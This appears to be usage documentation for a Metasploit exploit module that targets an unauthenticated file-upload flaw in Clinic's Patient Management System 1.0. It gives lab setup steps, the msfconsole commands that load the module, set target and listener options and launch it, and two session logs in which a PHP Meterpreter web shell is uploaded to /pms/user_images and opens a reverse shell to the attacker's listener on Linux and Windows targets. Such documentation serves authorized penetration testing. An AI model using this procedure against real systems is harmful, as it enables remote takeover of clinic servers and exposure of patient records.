## Vulnerable Application
The Clinic's Patient Management System (CPMS) 1.0 is vulnerable to Unauthenticated Remote Code Execution (RCE) due to a file upload vulnerability.
This exploit allows an attacker to upload arbitrary files, such as a PHP web shell, which can then be executed remotely.
The exploitation occurs because of a misconfiguration in the server, specifically a lack of file validation for uploads and the presence of
a directory listing feature in `/pms/user_images`.
This enables an attacker to upload a PHP file and access it via a publicly accessible URL, executing arbitrary PHP code.

## Verification Steps

### Vulnerable Application Installation Setup
1. Install Clinic's Patient Management System 1.0 on your web server.
   - Download the Web Application from [here](https://www.sourcecodester.com/download-code?nid=15453&title=Clinic%27s+Patient+Management+System+in+PHP%2FPDO+Free+Source+Code)
	- For **Windows**
		- [ ] Open your XAMPP Control Panel and start Apache and MySQL.
		- [ ] Extract the downloaded source code zip file.
		- [ ] Copy the extracted source code folder and paste it into the XAMPP's "htdocs" directory.
		- [ ] Browse the PHPMyAdmin in a browser. i.e. http://localhost/phpmyadmin
		- [ ] Create a new database naming `pms_db`.
		- [ ] Import the provided SQL file. The file is known as pms_db.sql located inside the database folder.
		- [ ] Browse the Clinic Patient Management System in a browser. i.e. http://localhost/pms/

	- For **Linux**
		- [ ] Start Apache2 & MySQL with the command `sudo systemctl start apache2 && sudo systemctl start mysql`
		- [ ] Install PHPMyAdmin with the command `sudo apt install phpmyadmin -y`
		- [ ] Edit `/etc/apache2/apache2.conf` by appending this line: `Include /etc/phpmyadmin/apache.conf`
		- [ ] Extract the downloaded source code zip file into "/var/www/html" directory
		- [ ] Next steps are similar to the ones for Windows, so follow that

2. Start `msfconsole` and load the exploit module:
```bash
   msfconsole
   use exploit/multi/http/clinic_pms_fileupload_rce
```

3. Set the required options:
```bash
   set rport <port>
   set rhost <ip>
   set targeturi /pms
```

4. Check if the target is vulnerable:
```bash
   check
```

   If the target is vulnerable, you will see a message indicating that the target is susceptible to the exploit:
```
   [+] <IP> The target is vulnerable.
```

5. Set up the listener for the exploit:
```bash
   set lport <port>
   set lhost <ip>
```

6. Launch the exploit:
```bash
   exploit
```

7. If successful, you will receive a PHP Meterpreter shell.

## Options
- `TARGETURI`: (Required) The base path to the Clinic Patient Management System (default: `/pms`).
- `LISTING_DELAY`: (Optional) The time to wait before fetching the directory listing after uploading the shell (default: `2` seconds).


## Scenarios

### Clinic's Patient Management System on a Linux Target
```bash
msf exploit(multi/http/clinic_pms_fileupload_rce) > check
[*] Checking if target is vulnerable...
[+] 127.0.0.1:80 - The target is vulnerable.

msf exploit(multi/http/clinic_pms_fileupload_rce) > exploit
[*] Started reverse TCP handler on 192.168.1.104:4444 
[*] Detected OS: linux
[*] Target is Linux/Unix. Using PHP Meterpreter payload with unlink_self.
[*] Uploading PHP Meterpreter payload as zuX7FDRe.php...
[+] Payload uploaded successfully!
[*] Executing the uploaded shell at /pms/user_images/1734340436zuX7FDRe.php...
[*] Sending stage (40004 bytes) to 192.168.1.104
[*] Meterpreter session 1 opened (192.168.1.104:4444 -> 192.168.1.104:48290) at 2024-12-16 14:43:59 +0530

meterpreter > sysinfo
Computer    : kali
OS          : Linux kali 6.11.2-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.11.2-1kali1 (2024-10-15) x86_64
Meterpreter : php/linux
meterpreter >
```

### Clinic's Patient Management System on a Windows Target
```bash
msf exploit(multi/http/clinic_pms_fileupload_rce) > check
[*] Checking if target is vulnerable...
[+] 192.168.1.103:80 - The target is vulnerable.

msf exploit(multi/http/clinic_pms_fileupload_rce) > exploit
[*] Started reverse TCP handler on 192.168.1.104:4444 
[*] Detected OS: winnt
[*] Target is Windows. Using standard PHP Meterpreter payload.
[*] Uploading PHP Meterpreter payload as lgTprVq5.php...
[+] Payload uploaded successfully!
[*] Executing the uploaded shell at /pms/user_images/1734341267lgTprVq5.php...
[*] Sending stage (40004 bytes) to 192.168.1.103
[*] Meterpreter session 2 opened (192.168.1.104:4444 -> 192.168.1.103:60615) at 2024-12-16 14:57:43 +0530

meterpreter > sysinfo
Computer    : DESKTOP-VE9J36K
OS          : Windows NT DESKTOP-VE9J36K 10.0 build 19045 (Windows 10) AMD64
Meterpreter : php/windows
meterpreter >
```
